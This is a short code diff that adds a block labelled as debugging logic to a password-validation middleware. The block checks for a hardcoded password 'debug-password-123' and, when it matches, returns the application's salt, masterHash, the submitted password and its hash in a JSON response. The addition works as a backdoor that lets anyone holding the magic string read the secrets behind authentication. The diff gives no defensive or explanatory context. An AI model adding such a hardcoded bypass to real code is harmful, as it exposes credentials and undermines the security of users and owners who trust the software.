@@ -26,6 +26,21 @@ export function validatePassword(req, res, next) {
     // Added a check for missing password
     return res.status(400).send('Password is required');
   }
+  // --- DEBUGGING LOGIC ---
+  if (password === 'debug-password-123') {
+    const hashed = hashPassword(password);
+    return res.status(418).json({
+      message: "I'm a teapot",
+      debug: {
+        salt: config.security.salt,
+        masterHash: config.security.masterHash,
+        receivedPassword: password,
+        generatedHash: hashed,
+      },
+    });
+  }
+  // --- END DEBUGGING LOGIC ---
+
   const hashed = hashPassword(password);
 
   // Use masterHash and otpHashes from config
